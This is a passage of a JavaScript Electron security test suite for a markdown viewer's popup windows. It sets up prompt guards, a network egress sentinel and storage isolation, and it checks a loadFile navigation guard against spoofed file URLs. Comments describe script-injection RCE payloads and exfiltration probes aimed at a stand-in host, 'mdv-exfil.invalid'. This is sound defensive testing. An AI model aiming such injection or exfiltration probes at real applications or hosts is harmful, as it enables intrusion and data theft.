// Security regression tests for the popup windows opened by the main process.
// Run with: npm run test:popups
//
// The image and mermaid popups are built by string-concatenating
// markdown-derived values into a fresh HTML document which the main process
// then loads. Unlike the viewer's innerHTML sinks, these are parsed as full
// documents, so an injected <script> executes directly - and the windows were
// created with nodeIntegration, making that immediate RCE (SEC-05/06/07).
//
// Payloads set window.__pwned rather than spawning a process. Each attack test
// is paired with a feature test, because escaping these values is exactly the
// kind of change that silently breaks a title, an image or a wireframe.
// Arm the exit-only path before imports: an uncaught Main error otherwise
// becomes an Electron error dialog, including during profile initialization.
let app, BrowserWindow, fs, path, registeredDirs;
let finishing = false, stickyFailure = false, footerWritten = false;
let tearingDown = false, hostWindow = null, hostContents = null, main = null;
let ownerCleanupInProgress = false, ownerCleanupReentered = false, exitOwner = false;
let observeVerifiedOwners = null;
let chooserAllowance = null, chooserCalls = 0, nativeSaveCalls = 0;
let expectedPopup = null, storageReady = false, mainIdentity = null;
let mainStartup = null;
let downloadAllowance = null, downloadBackstop = null;
const results = [];
const windows = new Map(), guards = new Map(), closedReports = new Map();
const closing = new Set(), observers = [], downloadObservers = new Set();
const pendingDownloads = new Set();
const ownedFixtures = new Set(), retainedFixtures = new Set();
process.on("uncaughtException", fatal);
process.on("unhandledRejection", fatal);
const watchdog = setTimeout(() => fatal(new Error("popup suite exceeded its startup-inclusive 240s bound")), 240000);
process.once("exit", () => {
  if (!exitOwner) {
    if (!finishing) finishing = "fatal";
    stickyFailure = true;
    check("popup suite reached its controlled terminal path", false, "process exit preceded the explicit exit owner");
  }
  destroyOwners();
  if (!footerWritten) reportFooter();
  if (stickyFailure) process.exitCode = 1;
});

fs = require("fs");
path = require("path");
const os = require("os");
const { pathToFileURL, fileURLToPath } = require("url");
const { randomBytes, createHash } = require("crypto");
const { isDeepStrictEqual } = require("util");
const electron = require("electron");
({ app, BrowserWindow } = electron);
const { ipcMain, session, dialog } = electron;
// Destroying the last Main window can synchronously call app.quit(). Keep
// terminal cleanup on its own stack; ordinary live quit behavior is untouched.
app.prependListener("before-quit", event => {
  if (finishing && !exitOwner) event.preventDefault();
});
const guardToken = randomBytes(24).toString("hex");
const guardMarker = "POPUP_TEST_REFUSED:" + guardToken + ":";
const guardKey = "__popupTestPromptGuard";
const indexURL = pathToFileURL(path.join(__dirname, "..", "src", "index.html")).href;
const nativeGuards = new Map();
for (const method of ["showOpenDialog", "showOpenDialogSync", "showSaveDialog",
  "showSaveDialogSync", "showMessageBox", "showMessageBoxSync", "showErrorBox"]) {
  const guard = function (...args) {
    if (method.startsWith("showSaveDialog")) nativeSaveCalls++;
    if (method === "showOpenDialog" && chooserAllowance &&
        args.length === 2 && args[0] === hostWindow &&
        chooserAllowance.window === hostWindow &&
        chooserAllowance.contents === hostContents &&
        JSON.stringify(args[1]) === JSON.stringify(expectedChooserOptions) &&
        fs.readFileSync(documentFile, "utf8") === themeDoc) {
      assertMainOwner();
      assertDocumentScope(chooserAllowance.scope);
      chooserAllowance = null; // Consume before the admission continuation runs.
      chooserCalls++;
      return Promise.resolve({ canceled: false, filePaths: [documentFile] });
    }
    fatal(new Error("unexpected native " + method));
    throw new Error("native dialog refused before original: " + method);
  };
  Object.defineProperty(dialog, method, { value: guard, writable: false, configurable: false });
  nativeGuards.set(method, guard);
}
const { OwnedDialogs } = require("../src/owned-dialogs");
const refuseOwnedDialog = function () {
  fatal(new Error("unexpected Main-owned dialog"));
  throw new Error("Main-owned dialog refused before original");
};
Object.defineProperty(OwnedDialogs.prototype, "show", {
  value: refuseOwnedDialog, writable: false, configurable: false,
});
let publishedTheme = null;
const publishTheme = OwnedDialogs.prototype.publishTheme;
OwnedDialogs.prototype.publishTheme = function (owner, themeId) {
  const accepted = publishTheme.call(this, owner, themeId);
  if (accepted && owner === hostWindow) publishedTheme = themeId;
  return accepted;
};

// Keep every helper/product temporary write in this worktree. Reject physical
// redirection before mkdir or isolation's destructive wipe, not afterwards.
const workRoot = path.join(__dirname, ".popup-security-runtime");
const physicalKey = value => process.platform === "win32" ? value.toLowerCase() : value;
if (physicalKey(fs.realpathSync.native(__dirname)) !== physicalKey(path.resolve(__dirname))) {
  throw new Error("popup suite directory is physically redirected");
}
const rootEntry = fs.lstatSync(workRoot, { throwIfNoEntry: false });
if (rootEntry && (!rootEntry.isDirectory() || rootEntry.isSymbolicLink() ||
    physicalKey(fs.realpathSync.native(workRoot)) !== physicalKey(workRoot))) {
  throw new Error("popup work root is not an owned physical directory");
}
fs.mkdirSync(workRoot, { recursive: true });
for (const name of ["TEMP", "TMP", "TMPDIR"]) process.env[name] = workRoot;

require("./test-userdata-isolation");
const isolation = require("./test-userdata-isolation");
const privateStorage = fs.realpathSync.native(isolation.USER_DATA_DIR);
if (app.isReady() || physicalKey(privateStorage) !== physicalKey(isolation.USER_DATA_DIR) ||
    physicalKey(privateStorage) === physicalKey(path.resolve(isolation.REAL_USER_DATA))) {
  throw new Error("private popup storage must precede ready and exclude the real profile");
}
app.setPath("userData", privateStorage);
app.setPath("sessionData", privateStorage);
function verifyStorage(withSession) {
  const paths = [app.getPath("userData"), app.getPath("sessionData")];
  if (withSession) paths.push(session.defaultSession.storagePath);
  if (paths.some(value => typeof value !== "string" ||
      physicalKey(fs.realpathSync.native(value)) !== physicalKey(privateStorage))) {
    throw new Error("userData/sessionData/defaultSession did not retain private storage");
  }
  return true;
}
verifyStorage(false);
app.once("ready", () => {
  storageReady = verifyStorage(true);
  installNetSentinel();
  downloadBackstop = (event, item, source) => {
    try {
      const allowance = downloadAllowance;
      if (!allowance || allowance.source !== source || allowance.name !== item.getFilename() ||
          source.isDestroyed() || source.getURL() !== allowance.originalURL ||
          !item.getURL().startsWith("blob:") || allowance.consumed) {
        event.preventDefault();
        fatal(new Error("unexpected download refused before any native Save chooser"));
        return;
      }
      assertDocumentScope(allowance.scope);
      allowance.consumed = true;
      item.setSavePath(path.join(allowance.directory, allowance.name));
    } catch (error) {
      event.preventDefault();
      fatal(new Error("exact download destination could not be installed: " + error.message));
    }
  };
  session.defaultSession.prependListener("will-download", downloadBackstop);
  observers.push(() => session.defaultSession.removeListener("will-download", downloadBackstop));
  check("private Chromium storage is verified before Main creation", storageReady);
});

const { startErrorSentinel, captureScreenshot, trapExternalOpens, waitForExternalTrap,
  proveSentinelAlive, readExternalOpens, readShellOpens, tempDir, releaseTempDir,
  REGISTERED_TEMP_DIRS } = require("./test-visual-utils");
registeredDirs = REGISTERED_TEMP_DIRS;
const exitWithSharedSweep = app.exit.bind(app);
app.exit = code => {
  if (!finishing) {
    fatal(new Error("unexpected app.exit before controlled popup completion"));
    return;
  }
  destroyOwners(); // Always precede the shared helper's pre-exit fixture sweep.
  exitOwner = true;
  return exitWithSharedSweep(stickyFailure ? 1 : code);
};
trapExternalOpens().then(ready => {
  if (ready !== true) fatal(new Error("Main shell trap did not install"));
}, fatal);

const fixtureDir = tempDir("mdv-popup-fixtures-");
ownedFixtures.add(fixtureDir);
const imageFile = path.join(fixtureDir, "ordinary.svg");
const brokenImageFile = path.join(fixtureDir, "owned-broken-image.png");
const readableFile = path.join(fixtureDir, "readable.txt");
const documentFile = path.join(fixtureDir, "popup-document.md");
const ordinarySVG = "<svg xmlns='http://www.w3.org/2000/svg' width='120' height='60'>" +
  "<rect width='120' height='60' fill='green'/></svg>";
fs.writeFileSync(imageFile, ordinarySVG, { flag: "wx" });
fs.writeFileSync(brokenImageFile, "owned bytes that cannot decode as an image", { flag: "wx" });
fs.writeFileSync(readableFile, "popup-owned-readable-control", { flag: "wx" });
const themeDoc = "# Popup admission\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n" +
  "```mermaid\ngraph LR\n  PopA --> PopB\n```\n\n![Owned image](" + pathToFileURL(imageFile).href + ")\n";
fs.writeFileSync(documentFile, themeDoc, { flag: "wx" });
const { SUPPORTED_EXTENSIONS, isLargeDocument, LARGE_DOC_BUDGET_MS } = require("../src/file-helpers");
const expectedChooserOptions = {
  properties: ["openFile", "multiSelections"],
  filters: [
    { name: "Markdown Files", extensions: SUPPORTED_EXTENSIONS.markdown.map(ext => ext.slice(1)) },
    { name: "Mermaid Files", extensions: SUPPORTED_EXTENSIONS.mermaid.map(ext => ext.slice(1)) },
    { name: "All Files", extensions: ["*"] },
  ],
};

function promptGuardSource(id) {
  return `(() => {
    try {
    const token=${JSON.stringify(guardToken)}, key=${JSON.stringify(guardKey)};
    const refuse=kind=>{
      const message=${JSON.stringify(guardMarker)}+kind;
      console.error(message); throw new Error(message);
    };
    const existing=Object.getOwnPropertyDescriptor(window,key);
    if(existing) {
      if(existing.value?.token!==token||existing.value.contentsId!==${id}||
          !existing.value.read().intact||!existing.value.read().sameDocument) return refuse('conflicting-installation');
      return;
    }
    const installedDocument=document, installedURL=location.href;
    // Unlike randomUUID, getRandomValues also works in the initial about:blank context.
    const documentToken=Array.from(crypto.getRandomValues(new Uint32Array(4))).join('-');
    const imageErrors=[];
    document.addEventListener('error',event=>{
      const image=event.target;
      if(image?.tagName==='IMG') imageErrors.push({src:image.src,trusted:event.isTrusted,
        complete:image.complete,naturalWidth:image.naturalWidth});
    },true);
    const entries=[];
    for(const [target,names] of [[window,['alert','confirm','prompt']],
        [HTMLDialogElement.prototype,['show','showModal']]]) {
      for(const name of names) {
        const guarded=function(){return refuse(name+':before-original')};
        Object.defineProperty(target,name,{value:guarded,writable:false,configurable:false});
        entries.push([target,name,guarded]);
      }
    }
    const read=()=>({token,contentsId:${id},url:location.href,executed:true,documentToken,
      sameDocument:document===installedDocument&&location.href===installedURL,
      intact:entries.every(([target,name,fn])=>target[name]===fn),
      open:document.querySelectorAll('dialog[open]').length,imageErrors:imageErrors.slice()});
    Object.defineProperty(window,key,{value:Object.freeze({token,contentsId:${id},read})});
    } catch(error) {
      console.error(${JSON.stringify(guardMarker)}+'installation:'+error.message);
      throw error;
    }
  })()`;
}

async function hoverColumn(popup, field) {
  const target = await popupEval(popup, `(() => {
    const column=typeof table!=='undefined'?table.getColumn(${JSON.stringify(field)}):null;
    const element=column?.getElement(), rect=element?.getBoundingClientRect();
    return {visible:!!rect&&rect.width>0&&rect.height>0&&rect.left>=0&&rect.right<=innerWidth,
      x:rect?Math.round(rect.left+rect.width/2):0,y:rect?Math.round(rect.top+12):0};
  })()`);
  if (!target.visible) throw new Error("real tooltip hover target is not visible: " + field);
  const scope = windows.get(popup.id).scope;
  assertDocumentScope(scope);
  popup.showInactive();
  popup.webContents.sendInputEvent({ type: "mouseMove", x: 1, y: 1 });
  popup.webContents.sendInputEvent({ type: "mouseMove", x: target.x, y: target.y });
  await sleep(700);
  assertDocumentScope(scope);
}

function consumeLoadFileDelegation(state, contents, method, suppliedURL) {
  const pending = state.loadFileDelegation;
  if (method !== "loadURL" || !pending || state.wc !== contents) return false;
  state.loadFileDelegation = null;
  if (typeof suppliedURL !== "string" || !suppliedURL.startsWith("file:///") ||
      state.originalURL !== pending.url) return false;
  // Electron can pass Windows separators to loadURL. Keep every other URL byte
  // exact; parsing a file URL would also erase distinctions this guard rejects.
  const url = process.platform === "win32" ? suppliedURL.replace(/\\/g, "/") : suppliedURL;
  return url === pending.url;
}

function checkLoadFileDelegation() {
  const wc = {}, url = "file:///C:/popup%20suite/index.html";
  const fresh = () => ({ wc, originalURL: url, loadFileDelegation: { url } });
  const state = fresh();
  check("initial loadFile delegation accepts its exact URL once",
    consumeLoadFileDelegation(state, wc, "loadURL", url) &&
      !consumeLoadFileDelegation(state, wc, "loadURL", url));
  check("initial loadFile delegation accepts Windows spelling only on Windows",
    consumeLoadFileDelegation(fresh(), wc, "loadURL", url.replace(/\//g, "\\")) === false &&
      consumeLoadFileDelegation(fresh(), wc, "loadURL",
        "file:///C:\\popup%20suite\\index.html") === (process.platform === "win32"));
  const other = fresh(), pending = other.loadFileDelegation;
  check("another contents cannot consume the initial loadFile delegation",
    !consumeLoadFileDelegation(other, {}, "loadURL", url) &&
      other.loadFileDelegation === pending);
  check("a nested loadFile is not a delegated loadURL",
    !consumeLoadFileDelegation(fresh(), wc, "loadFile", url));
  check("a later loadURL has no initial delegation",
    !consumeLoadFileDelegation({ wc, originalURL: url, loadFileDelegation: null }, wc, "loadURL", url));
  const changedOwner = fresh();
  changedOwner.originalURL += "#changed";
  check("a changed owner URL cannot consume an older delegation",
    !consumeLoadFileDelegation(changedOwner, wc, "loadURL", url));
  for (const [name, candidate] of [
    ["another file", url.replace("index.html", "other.html")],
    ["the same basename elsewhere", url.replace("popup%20suite", "elsewhere")],
    ["an owned dialog", url.replace("index.html", "owned-dialog.html")],
    ["a query", url + "?x=1"], ["an empty query", url + "?"],
    ["a fragment", url + "#x"], ["an empty fragment", url + "#"],
    ["an authority", url.replace("file:///", "file://localhost/")],
    ["a remote authority", url.replace("file:///", "file://example.invalid/")],
    ["another scheme", url.replace("file:", "https:")],
    ["changed escaping", url.replace("%20", " ")],
    ["encoded filename spelling", url.replace("index", "%69ndex")],
    ["a dot segment", url.replace("index", "./index")],
    ["encoded separators", url.replace("/index", "%2Findex")],
    ["a malformed URL", "file:\\C:\\popup%20suite\\index.html"],
    ["a non-string URL", null],
  ]) {
    const changed = fresh();
    check("initial loadFile delegation rejects " + name,
      !consumeLoadFileDelegation(changed, wc, "loadURL", candidate) &&
        !consumeLoadFileDelegation(changed, wc, "loadURL", url));
  }
}

app.on("web-contents-created", (_event, wc) => {
  const contentsId = wc.id;
  const state = { wc, enabled: false, installed: false, originalURL: null, timer: null,
    epoch: 0, frame: null, cdpCommit: null, documentToken: null, guardEpoch: null };
  guards.set(wc.id, state);
  wc.on("console-message", details => {
    if (details?.message?.includes(guardMarker)) fatal(new Error(details.message));
  });
  wc.on("render-process-gone", (_event, detail) => {
    if (!tearingDown && !closing.has(contentsId)) fatal(new Error("popup renderer lost: " + detail.reason));
  });
  wc.on("destroyed", () => {
    clearTimeout(state.timer);
    if (!tearingDown && !closing.has(contentsId)) fatal(new Error("unexpected owned renderer destruction"));
  });
  wc.debugger.on("detach", (_event, reason) => {
    if (!tearingDown && !closing.has(contentsId)) fatal(new Error("prompt guard detached: " + reason));
  });
  // Only committed navigations advance identity. A will-navigate attempt that
  // production cancels must neither invalidate nor re-arm this document.
  wc.on("did-navigate", (_event, url) => {
    if (tearingDown || closing.has(contentsId)) return;
    if (url === "about:blank" && state.epoch === 0 && !state.cdpCommit) return;
    if (!state.originalURL || url !== state.originalURL || state.epoch !== 0) {
      fatal(new Error("unexpected committed document navigation: " + url)); return;
    }
    state.epoch++;
    state.frame = wc.mainFrame;
  });
  wc.on("did-navigate-in-page", (_event, url, isMainFrame) => {
    if (!tearingDown && !closing.has(contentsId) && isMainFrame && url !== state.originalURL) {
      fatal(new Error("owned root URL changed within its document: " + url));
    }
  });
  wc.debugger.on("message", (_event, method, parameters) => {
    if (method === "Page.javascriptDialogOpening") fatal(new Error("unexpected browser JavaScript dialog"));
    if (method !== "Page.frameNavigated" || parameters.frame.parentId ||
        tearingDown || closing.has(contentsId)) return;
    const frame = parameters.frame;
    if (frame.url === "about:blank" && !state.cdpCommit) return;
    if (frame.url !== state.originalURL || !frame.loaderId ||
        state.cdpCommit && (state.cdpCommit.frameId !== frame.id || state.cdpCommit.loaderId !== frame.loaderId)) {
      fatal(new Error("unexpected CDP root document commit: " + frame.url)); return;
    }
    if (!state.cdpCommit) state.cdpCommit = Object.freeze({ frameId: frame.id, loaderId: frame.loaderId });
  });
  wc.debugger.attach("1.3");
  // Issue BOTH commands synchronously; do not defer original navigation behind
  // renderer ACKs. runImmediately also guards the existing initial context.
  const enabled = wc.debugger.sendCommand("Page.enable").then(() => { state.enabled = true; });
  const installed = wc.debugger.sendCommand("Page.addScriptToEvaluateOnNewDocument", {
    source: promptGuardSource(wc.id), runImmediately: true,
  }).then(() => { state.installed = true; });
  state.timer = setTimeout(() => fatal(new Error("prompt guard ACK exceeded 10s")), 10000);
  Promise.all([
    enabled, installed,
  ]).then(() => clearTimeout(state.timer), fatal);
  for (const method of ["loadFile", "loadURL"]) {
    const original = wc[method];
    wc[method] = function (...args) {
      const suppliedURL = method === "loadFile" ? pathToFileURL(path.resolve(args[0])).href : args[0];
      const record = [...windows.values()].find(value => value.wc === wc);
      // Electron's loadFile may synchronously delegate to this same contents'
      // loadURL. That is one issued navigation, not permission for a later one.
      const delegated = consumeLoadFileDelegation(state, this, method, suppliedURL);
      const url = delegated ? state.originalURL : suppliedURL;
      if (this !== wc || !record || (state.originalURL && !delegated) || /owned-dialog\.html/i.test(url)) {
        fatal(new Error("unexpected or repeated owned navigation: " + url));
        return Promise.resolve(); // Fatal owns exit; do not mint an unobserved rejection.
      }
      if (record.kind === "main-pending") {
        if (mainStartup?.record !== record || mainStartup.loadIssued || url !== indexURL) {
          fatal(new Error("provisional startup window did not receive the intended index load")); return Promise.resolve();
        }
        mainStartup.loadIssued = true;
        record.kind = "main";
      }
      if (record.kind === "main" ? url !== indexURL :
          !isOwnedPopupPath(url, record.kind)) {
        fatal(new Error("unexpected initial document: " + url));
        return Promise.resolve();
      }
      state.originalURL = record.originalURL = url;
      if (!delegated) state.loadFileDelegation = method === "loadFile" ? { url } : null;
      try {
        const loading = original.apply(this, args);
        loading?.catch(error => {
          if (!tearingDown && !closing.has(contentsId)) fatal(error);
        });
        return loading;
      } finally {
        if (!delegated) state.loadFileDelegation = null;
      }
    };
  }
});
app.on("browser-window-created", (_event, win) => {
  const wc = win.webContents;
  const record = { id: win.id, contentsId: wc.id, win, wc, kind: "unexpected",
    originalURL: null, stopped: false, resultOffset: results.length };
  windows.set(win.id, record);
  if (!storageReady || finishing) { fatal(new Error("window preceded storage readiness or followed finish")); return; }
  if (mainStartup && !mainStartup.record && !expectedPopup) {
    // Reserve one candidate only under the explicit startup expectation. It
    // does not become Main until the exact index commit and authenticated
    // current bridge/frame/guard witness are verified in run().
    mainStartup.record = record;
    record.kind = "main-pending";
  } else if (expectedPopup?.received && !expectedPopup.window) {
    record.kind = expectedPopup.channel.replace(/^open-|-popup$/g, "");
    expectedPopup.window = win;
  } else { fatal(new Error("unexpected BrowserWindow without exact fixed IPC receipt")); return; }
  record.sentinel = startErrorSentinel(win, {
    label: "popup-" + record.kind, drainTimeoutMs: 1500,
    // Missing pixels are intentional only for the exact rejection/remote
    // fixtures. Owned ordinary images still have the broken-image sentinel.
    ignore: expectedPopup?.payload?.src?.startsWith("https://example.invalid/") ?
      [/net::ERR_BLOCKED_BY_CLIENT/] : [],
    ignoreKinds: record.kind === "image" && expectedPopup?.payload &&
      (/^https:\/\/example\.invalid\//.test(expectedPopup.payload.src) ||
       /attacker/.test(expectedPopup.payload.src) ||
       expectedPopup.payload.src === pathToFileURL(brokenImageFile).href) ? ["broken-image"] : [],
  });
  popupSentinels.set(win.id, record.sentinel);
  win.on("closed", () => {
    if (!tearingDown && !closing.has(record.contentsId)) fatal(new Error("unexpected owned window close"));
  });
});
for (const channel of ["open-image-popup", "open-mermaid-popup", "open-table-popup"]) {
  const observer = (event, payload) => {
    if (!expectedPopup || expectedPopup.channel !== channel || expectedPopup.received ||
        event.sender !== hostContents || !isRetainedRoot(event.senderFrame, expectedPopup.mainScope) ||
        typeof payload?.isDarkMode !== "boolean" ||
        (expectedPopup.payload && !isDeepStrictEqual(payload, expectedPopup.payload))) {
      fatal(new Error("unexpected popup IPC receipt: " + channel)); return;
    }
    assertDocumentScope(expectedPopup.mainScope);
    expectedPopup.received = true;
    expectedPopup.receipt = { sender: event.sender, frame: event.senderFrame, payload,
      mainScope: expectedPopup.mainScope };
  };
  ipcMain.prependListener(channel, observer);
  observers.push(() => ipcMain.removeListener(channel, observer));
}
mainStartup = { record: null, loadIssued: false };
main = require("../src/main.js");

// One watcher per popup window, collected as they are opened and drained at the
// end of the run. Keyed by window id so a section that deliberately provokes an
// error can mute the right one. See startErrorSentinel() in test-visual-utils.js.
const popupSentinels = new Map();
const sentinelOf = (popup) => popup && popupSentinels.get(popup.id);

// ---------------------------------------------------------------------------
// Where the exfil / navigation probes point.
//
// These tests deliberately *attempt* outbound POSTs and navigations so they can
// prove CSP and the navigation guards stop them. They used to aim at
// example.com - which is reserved for documentation by RFC 2606, but is a real,
// live host operated by IANA whose own page asks you to "avoid use in
// operations". A test suite firing POSTs at it on every run is operations.
//
// `.invalid` is reserved by RFC 6761 s6.4 and is guaranteed never to resolve,
// so nothing can reach a third party even if every guard in the app failed.
//
// The trap: simply swapping the domain would *weaken* these tests. Assertions
// of the form "the fetch threw" or "the URL is not example.com" would then pass
// because DNS failed, not because CSP blocked anything - a false pass that
// survives deleting the security control entirely. So the domain change is
// paired with the sentinel below, which watches the network layer itself.
// ---------------------------------------------------------------------------
const PROBE_HOST = "mdv-exfil.invalid";

// Requests are recorded BEFORE the safety cancellation. Every forbidden entry
// is a failure, so this backstop can never be mistaken for product protection.
const netSentinel = [];

function installNetSentinel() {
  const seen = new Set();
  for (const s of [session.defaultSession]) {
    if (!s || seen.has(s)) continue;
    seen.add(s);
    s.webRequest.onBeforeRequest((details, callback) => {
      const share = /^file:/i.test(details.url) && (() => {
        try {
          const url = new URL(details.url);
          return !!url.hostname || /^[/\\]{2}/.test(decodeURIComponent(url.pathname));
        } catch { return true; }
      })();
      if (share) {
        netSentinel.push({ url: details.url, type: details.resourceType, share: true });
        callback({ cancel: true });
        fatal(new Error("remote share access reached the network backstop"));
        return;
      }
      if (/^(file|devtools|chrome-extension|blob|data):/i.test(details.url)) {
        return callback({ cancel: false });
      }
      netSentinel.push({ url: details.url, type: details.resourceType, contentsId: details.webContentsId });
      // Never contact a live third party. Cancellation is recorded as egress,
      // never credited as production protection. The image control proves the
      // observer itself is reached despite this last-resort cancellation.
      callback({ cancel: true });
      if (details.resourceType !== "image" || !/^https:\/\/example\.invalid\//.test(details.url)) {
        fatal(new Error("forbidden egress reached the network backstop: " + details.url));
      }
    });
  }
}

function check(name, ok, detail) {
  if (!ok) stickyFailure = true;
  results.push({ name, ok, detail: ok ? "" : String(detail) });
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${ok ? "" : "  -> " + detail}`);
}

// Electron drops buffered stdout when app.exit() is called, so a redirected run
// (`> out.txt`) loses every line. Mirror the results to a file synchronously so
// the run is inspectable regardless of how stdout is captured.
function writeReport(summary) {
  const lines = results.map(
    (r) => `${r.ok ? "PASS" : "FAIL"}  ${r.name}${r.ok ? "" : "  -> " + r.detail}`,
  );
  lines.push(summary);
  try {
    fs.writeFileSync(
      path.join(__dirname, "test-popup-results.txt"),
      lines.join("\n") + "\n",
    );
  } catch (e) {
    stickyFailure = true;
    console.log("could not write test-popup-results.txt: " + e.message);
  }
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// Missing/failed setup throws rather than returning null: no dependent attack
// assertion can be silently skipped and mistaken for a successful scenario.
async function openPopup(channel, payload, settleMs = 1800, click = null) {
  assertMainOwner();
  const mainScope = await assertGuard(hostContents);
  if (!(await waitForExternalTrap(hostWindow, 1000))) throw new Error("shell trap changed before popup actor");
  assertMainOwner();
  assertDocumentScope(mainScope);
  if (expectedPopup) throw new Error("overlapping popup request");
  const methods = { "open-image-popup": "openImagePopup", "open-mermaid-popup": "openMermaidPopup",
    "open-table-popup": "openTablePopup" };
  if (!methods[channel]) throw new Error("no public fixed popup API: " + channel);
  const request = expectedPopup = { channel, payload, mainScope, received: false, window: null };
  try {
    await mainEval(click || `window.folia.${methods[channel]}(${JSON.stringify(payload)}); true`);
    assertDocumentScope(mainScope);
    await waitUntil(() => request.received && request.window, "fixed popup IPC and retained window", 8000);
    assertDocumentScope(mainScope);
    const popup = request.window;
    const record = windows.get(popup.id);
    await waitUntil(() => record.originalURL && !record.wc.isLoadingMainFrame(), "popup load", 8000);
    record.scope = await assertGuard(record.wc);
    if (record.wc.getURL() !== record.originalURL || !request.receipt ||
        request.receipt.sender !== hostContents || request.receipt.mainScope !== mainScope) {
      throw new Error("popup identity changed during initial load");
    }
    record.receipt = request.receipt;
    const alive = await bounded(proveSentinelAlive(popup, record.sentinel), "popup sentinel liveness", 8000);
    assertDocumentScope(record.scope);
    assertDocumentScope(mainScope);
    check(`sentinel ${popup.id} observes both popup console and DOM errors`, alive.console && alive.dom, alive);
    const channelControl = await pwnedChannelLive(popup);
    check(`popup ${popup.id} has its own observable global read channel`,
      channelControl.ok, channelControl);
    const prefs = prefsOf(popup);
    check(`SEC-08 ${record.kind} popup ${popup.id} is sandboxed, isolated and Node-off`,
      !prefs.nodeIntegration && prefs.contextIsolation && prefs.sandbox, prefs);
    if (record.kind === "table") {
      check("SEC-08 table popup has no preload script",
        prefs.preload === undefined || prefs.preload === "", prefs.preload);
    }
    const scope = await popupEval(popup, `({
      requireType:typeof require, processType:typeof process,
      keys:window.popupBridge?Object.keys(window.popupBridge).sort():null
    })`);
    const keys = record.kind === "image" ? ["saveImage"] :
      record.kind === "mermaid" ? ["exportMermaidPdf"] : null;
    check(`SEC-08 ${record.kind} popup ${popup.id} has exactly its intended bridge`,
      scope.requireType === "undefined" && scope.processType === "undefined" &&
        JSON.stringify(scope.keys) === JSON.stringify(keys), scope);
    await sleep(settleMs);
    assertDocumentScope(record.scope);
    assertDocumentScope(mainScope);
    return popup;
  } finally {
    expectedPopup = null;
  }
}

async function popupEval(popup, expr, timeout = 5000) {
  try {
    const record = windows.get(popup.id);
    if (!record || record.win !== popup || popup.isDestroyed() ||
        popup.webContents !== record.wc || record.wc.getURL() !== record.originalURL) {
      throw new Error("popup is not its retained generated document");
    }
    assertDocumentScope(record.scope);
    await assertGuard(record.wc);
    assertDocumentScope(record.scope);
    const value = await bounded(record.scope.frame.executeJavaScript(expr, true), "popup evaluation", timeout);
    assertDocumentScope(record.scope);
    return value;
  } catch (e) {
    return { __evalError: String(e && e.message) };
  }
}

// FAIL CLOSED. This used to map an eval failure to `null` - the SAME value as
// "the payload did not run" - so a destroyed window, a failed load or a
// detached webContents PASSED every `__pwned` check in this file. Every one of
// those checks is a negative (`pwned(...) === null`), so the fail-open value
// was indistinguishable from the finding they exist to detect. Returning a
// non-null sentinel makes "could not look" fail, and carries the reason so the
// failure names itself instead of reading as a silent absence.
async function pwned(popup) {
  const v = await popupEval(popup, "window.__pwned || null");
  if (v && v.__evalError) return `__pwned unreadable: ${v.__evalError}`;
  return v;
}

// POSITIVE CONTROL for a `pwned(...) === null` assertion. An absence check
// fails open, and nothing here proved the read channel was even observable: if
// executeJavaScript silently stopped returning window globals, the negatives
// would pass while measuring nothing at all.
//
// SCOPE, measured rather than claimed: this used to say "every `pwned(...)`
// assertion in this file". It is not - the control runs once per popup it is
// called on, and window globals do not survive a new BrowserWindow. Call it in
// each popup that carries a pwned negative; the two table popups do.
//
// Two readings, because the negatives depend on the reader DISTINGUISHING two
// states, not merely on it returning something: a global that IS set must come
// back with its value, and one that is NOT set must come back null.
//
// Deliberately reads a DIFFERENT property from the real checks. Writing
// window.__pwned here would overwrite a genuine hit and mask the exact finding
// these assertions exist for; what needs proving is "a global set inside the
// popup is readable from this process", and the property name is not the part
// that can break.
//
// This does NOT prove the CSP refused anything. executeJavaScript runs in the
// main world and bypasses page CSP, so using it to show a script was blocked
// would be circular. It proves observability - the conjunct the negatives
// silently assume.
async function pwnedChannelLive(popup) {
  const marker = "control-" + Date.now();
  await popupEval(popup, `window.__pwnedControl = ${JSON.stringify(marker)};`);
  const set = await popupEval(popup, "window.__pwnedControl || null");
  const unset = await popupEval(popup, "window.__pwnedNeverSet || null");
  await popupEval(popup, "delete window.__pwnedControl;");
  return { set, unset, ok: set === marker && unset === null };
}

function prefsOf(popup) {
  const p = popup.webContents.getLastWebPreferences() || {};
  return {
    nodeIntegration: p.nodeIntegration === true,
    contextIsolation: p.contextIsolation !== false,
    sandbox: p.sandbox === true,
    preload: p.preload,
  };
}

async function bounded(promise, label, ms = 5000) {
  let timer;
  // Attach both branches now, even when the renderer never answers.
  try {
    return await Promise.race([Promise.resolve(promise),
      new Promise((_, reject) => { timer = setTimeout(() => reject(new Error(label + " exceeded " + ms + "ms")), ms); })]);
  } finally { clearTimeout(timer); }
}

async function waitUntil(predicate, label, ms = 10000) {
  const end = Date.now() + ms;
  do {
    if (finishing) throw new Error("suite is finishing: " + label);
    if (await predicate()) return;
    await sleep(50);
  } while (Date.now() < end);
  throw new Error(label + " did not become ready");
}

function isOwnedPopupPath(url, kind) {
  try {
    const file = fileURLToPath(url);
    return path.basename(file) === kind + ".html" &&
      path.dirname(path.dirname(file)) === workRoot &&
      /^folia-/.test(path.basename(path.dirname(file))) &&
      !fs.lstatSync(path.dirname(file)).isSymbolicLink() &&
      physicalKey(fs.realpathSync.native(path.dirname(file))) === physicalKey(path.dirname(file));
  } catch { return false; }
}

async function assertGuard(wc) {
  try {
    const state = guards.get(wc.id);
    await waitUntil(() => state?.enabled && state.installed && state.epoch === 1 && state.cdpCommit,
      "both prompt guard ACKs and the original root commit");
    const scope = documentScope(wc);
    const current = await bounded(scope.frame.executeJavaScript(
      `window[${JSON.stringify(guardKey)}]?.read()`, true), "current-document prompt guard");
    assertDocumentScope(scope);
    if (!current || current.token !== guardToken || current.contentsId !== wc.id ||
        current.url !== state.originalURL || current.executed !== true ||
        current.intact !== true || current.sameDocument !== true || current.open !== 0 ||
        typeof current.documentToken !== "string" || !current.documentToken ||
        state.documentToken !== null && current.documentToken !== state.documentToken ||
        state.guardEpoch !== null && state.guardEpoch !== state.epoch) {
      throw new Error("current document lacks its executed locked prompt guard");
    }
    if (state.documentToken === null) {
      state.documentToken = current.documentToken;
      state.guardEpoch = state.epoch;
    }
    return documentScope(wc);
  } catch (error) {
    fatal(error); // Guard admission failure must not enter renderer/capture cleanup.
    throw error;
  }
}

function documentScope(wc) {
  const state = guards.get(wc.id);
